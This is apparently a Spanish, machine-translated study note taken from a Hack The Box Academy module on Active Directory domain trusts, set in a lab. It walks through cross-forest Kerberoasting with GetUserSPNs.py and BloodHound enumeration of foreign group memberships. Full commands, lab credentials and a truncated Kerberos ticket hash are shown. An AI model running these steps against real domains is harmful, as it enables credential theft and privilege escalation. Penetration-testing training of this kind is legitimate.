---------
- Tags: #GetUserSPNs #kerberoasting 
----------------
Como vimos en la sección anterior, a menudo es posible realizar Kerberoast a través de un fideicomiso forestal. Si esto es posible en el entorno que estamos evaluando, podemos realizarlo `GetUserSPNs.py`desde nuestro host de ataque Linux. Para hacer esto, necesitamos credenciales para un usuario que pueda autenticarse en el otro dominio y especificar la `-target-domain`bandera en nuestro comando. Al realizar esto en el `FREIGHTLOGISTICS.LOCAL`dominio, vemos una entrada SPN para la `mssqlsvc`cuenta.
## Kerberoasting entre bosques

#### Usando GetUserSPNs.py

```shell-session
lilscott6x9@htb[/htb]$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never> 
```
Volver a ejecutar el comando con la `-request`bandera agregada nos da el ticket TGS. También podríamos agregar `-outputfile <OUTPUT FILE>`la salida directamente a un archivo que luego podríamos darle la vuelta y ejecutar Hashcat.
#### Usando el indicador -request

```shell-session
lilscott6x9@htb[/htb]$ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never>               


$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/mssqlsvc*$10<SNIP>
```
## Cazando membresía en grupos extranjeros con Bloodhound-python

Como se indicó en la última sección, es posible que, de vez en cuando, veamos a usuarios o administradores de un dominio como miembros de un grupo en otro dominio. Dado que solo `Domain Local Groups`se permiten usuarios fuera de su bosque, no es raro ver a un usuario con privilegios elevados del dominio A como miembro del grupo de administradores integrado en el dominio B cuando se trata de una relación de confianza de bosque bidireccional. Si estamos probando desde un host Linux, podemos recopilar esta información utilizando la [implementación Python de BloodHound](https://github.com/fox-it/BloodHound.py) . Podemos utilizar esta herramienta para recopilar datos de múltiples dominios, ingerirlos en la herramienta GUI y buscar estas relaciones.

En algunas evaluaciones, nuestro cliente puede proporcionarnos una máquina virtual que obtenga una IP de DHCP y esté configurada para usar el DNS del dominio interno. Estaremos en un host de ataque sin DNS configurado en otras instancias. En este caso, necesitaríamos editar nuestro `resolv.conf`archivo para ejecutar esta herramienta, ya que requiere un nombre de host DNS para el controlador de dominio de destino en lugar de una dirección IP. Podemos editar el archivo de la siguiente manera usando los derechos sudo. Aquí hemos comentado las entradas actuales del servidor de nombres y hemos agregado el nombre de dominio y la dirección IP `ACADEMY-EA-DC01`como servidor de nombres.

#### Agregar información INLANEFREIGHT.LOCAL a /etc/resolv.conf

```shell-session
lilscott6x9@htb[/htb]$ cat /etc/resolv.conf 

# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
```
Una vez que esto esté implementado, podemos ejecutar la herramienta en el dominio de destino de la siguiente manera:
#### Ejecutando bloodhound-python contra INLANEFREIGHT.LOCAL

```shell-session
lilscott6x9@htb[/htb]$ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2

INFO: Found AD domain: inlanefreight.local
INFO: Connecting to LDAP server: ACADEMY-EA-DC01
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 559 computers
INFO: Connecting to LDAP server: ACADEMY-EA-DC01
INFO: Found 2950 users
INFO: Connecting to GC LDAP server: ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL
INFO: Found 183 groups
INFO: Found 2 trusts

<SNIP>
```

Repetiremos el mismo proceso, esta vez completando los datos del `FREIGHTLOGISTICS.LOCAL`dominio.

#### Agregar información FREIGHTLOGISTICS.LOCAL a /etc/resolv.conf

```shell-session
lilscott6x9@htb[/htb]$ cat /etc/resolv.conf 

# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238
```

El `bloodhound-python`comando será similar al anterior:
#### Ejecutando sabueso-python contra FREIGHTLOGISTICS.LOCAL

```shell-session
lilscott6x9@htb[/htb]$ bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2

INFO: Found AD domain: freightlogistics.local
INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 5 computers
INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
INFO: Found 9 users
INFO: Connecting to GC LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
INFO: Found 52 groups
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
```

Después de cargar el segundo conjunto de datos (ya sea cada archivo JSON o como un archivo zip), podemos hacer clic `Users with Foreign Domain Group Membership`debajo de la `Analysis`pestaña y seleccionar el dominio de origen como `INLANEFREIGHT.LOCAL`. Aquí, veremos que la cuenta de administrador integrada para el dominio INLANEFREIGHT.LOCAL es miembro del grupo de administradores integrado en el dominio FREIGHTLOGISTICS.LOCAL como vimos anteriormente.
#### Ver derechos peligrosos a través de BloodHound

![imagen](https://academy.hackthebox.com/storage/modules/143/foreign_membership.png)

---
## Pensamientos finales sobre los fideicomisos

Como se vio en las secciones anteriores, hay varias maneras de aprovechar las confianzas de dominio para obtener acceso adicional e incluso hacer un "final" y escalar privilegios en nuestro dominio actual. Por ejemplo, podemos tomar el control de un dominio en el que nuestro dominio actual confía y encontrar la reutilización de contraseñas en cuentas privilegiadas. Hemos visto cómo los derechos de administrador de dominio en un dominio secundario casi siempre significan que podemos escalar privilegios y comprometer el dominio principal mediante el ataque ExtraSids. Los fideicomisos de dominio son un tema bastante amplio y complejo. El manual de este módulo nos ha brindado las herramientas para enumerar fideicomisos y realizar algunos ataques estándar dentro y entre bosques.